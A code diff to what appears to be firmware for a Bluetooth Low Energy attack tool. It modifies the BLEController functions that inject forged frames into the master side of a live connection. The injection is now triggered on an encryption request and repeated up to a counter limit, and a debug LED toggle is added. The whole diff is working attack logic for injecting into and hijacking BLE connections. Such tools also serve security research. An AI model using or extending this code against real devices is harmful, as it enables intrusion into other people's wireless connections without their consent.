@@ -1005,7 +1005,7 @@ void BLEController::executeInjectionToMaster() {
 	this->radio->updateTXBuffer(tx_buffer,2);
 	*/
 	 // Dirty version : working
-
+	 bsp_board_led_invert(1);
 	 this->attackStatus.payload[0] = (this->attackStatus.payload[0] & 0xF3) | (this->simulatedSlaveSequenceNumbers.nesn  << 2) | (this->simulatedSlaveSequenceNumbers.sn << 3); // MD = 1
 	 this->radio->updateTXBuffer(this->attackStatus.payload,this->attackStatus.size);
 	 this->simulatedSlaveSequenceNumbers.sn = (this->simulatedSlaveSequenceNumbers.sn + 1) % 2; // necessary ?
@@ -1027,7 +1027,10 @@ void BLEController::executeMasterRelatedHijacking() {
 void BLEController::executeAttack() {
 	if (this->attackStatus.running && !this->attackStatus.successful) {
 		if (this->attackStatus.attack == BLE_ATTACK_FRAME_INJECTION_TO_MASTER) {
-			this->executeInjectionToMaster();
+			if (this->attackStatus.injecting) {
+				this->executeInjectionToMaster();
+				this->attackStatus.injectionCounter++;
+			}
 		}
 		else {
 			this->executeInjectionToSlave();
@@ -1411,11 +1414,15 @@ void BLEController::connectionSynchronizationProcessing(BLEPacket *pkt) {
 
 void BLEController::attackSynchronizationProcessing(BLEPacket *pkt) {
 	int32_t relativeTimestamp = (int32_t)(pkt->getTimestamp() - this->lastAnchorPoint);
-	if (this->controllerState == INJECTING_TO_MASTER && relativeTimestamp > 400) {
-		bsp_board_led_invert(0);
-		this->attackStatus.running = false;
-		this->attackStatus.successful = true;
-		this->exitSlaveMode();
+	if (this->controllerState == INJECTING_TO_MASTER/* && relativeTimestamp > 400*/) {
+		if (pkt->isEncryptionRequest()) {
+			this->attackStatus.injecting = true;
+		}
+		if (this->attackStatus.injectionCounter > 3) {
+			this->attackStatus.injecting = false;
+			this->attackStatus.injectionCounter = 0;
+			this->exitSlaveMode();
+		}
 		//this->attackStatus.payload[0] = (this->attackStatus.payload[0] & 0xF3) | (this->simulatedSlaveSequenceNumbers.nesn  << 2) | (this->simulatedSlaveSequenceNumbers.sn << 3); // MD = 1
 		//this->radio->updateTXBuffer(this->attackStatus.payload,this->attackStatus.size);
 	}
